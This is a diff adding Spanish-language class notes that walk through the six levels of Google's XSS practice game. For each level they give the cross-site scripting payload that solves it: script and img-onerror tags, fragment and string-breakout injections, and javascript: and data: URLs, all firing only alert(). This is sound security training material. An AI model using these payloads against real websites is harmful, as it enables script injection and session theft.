@@ -1,0 +1,46 @@
+
+https://xss-game.appspot.com/
+
+# Level 1: Hello, world of XSS ------------------------------------------
+<script>alert("Hola clase")</script>
+
+# Level 2: Persistence is key ------------------------------------------
+# Al igual que el nivel anterior, la vulnerabilidad de esta página es incluir HTML directamente en la página. Pero, esta vez hay una validación que nos impide usar la etiqueta script. Para evitarlo, podemos insertar una etiqueta de imagen con una URL no válida y un atributo onerror que ejecutará una alerta de javascript.
+
+<img src=x onerror=alert("Hola otra vez")>
+
+
+# Level 3: That sinking feeling...  --------------------------------------
+# La aplicación elige la pestaña de imagen en función del primer fragmento de URL (el hash después de la URL). 
+# Al pasar un fragmento malintencionado que se insertará en la página, se activará la alerta.
+
+https://xss-game.appspot.com/level3/frame#'   
+
+1' onerror='alert("Me salto el frame");//
+
+# Level 4: Context matters -----------------------------------------
+# Si miramos el código - Target code (toggle) - el javascript intentará evaluar 3**alert() antes de llamar a la función startTimer. Además, para evaluar el resultado de 3**alert() necesita obtener el valor devuelto por la función alert(), lo que hará que el navegador ejecute la función alert.
+
+3' & alert());//
+3'**alert());//
+');alert('xss
+
+# Level 5: Breaking protocol ------------------------------------
+# En la página de registro podemos ingresar una dirección de correo electrónico (o cualquier cosa, no se evalúa después de todo), Podemos engañar al parámetro next inyectando código javascript en él, ejecutando la función de alerta.
+
+https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("xss")
+email: cualquier-cosa
+
+
+# Follow the 🐇 ------------------------------------------------------- 
+
+https://xss-game.appspot.com/level6/frame#     
+data:text/plain,alert('xss')
+
+-----
+https://medium.com/@.Qubit/google-xss-game-walkthrough-3eaf04dc89a3
+https://gist.github.com/djadmin/737a77b87d0bad8a9c79
+https://gist.github.com/pbssubhash/2f99644a4f24e8fe6b3e
+
+
+https://hackingparanovatos.wordpress.com/2017/08/30/xss-que-es-ejecutar-scripts-en-una-web/
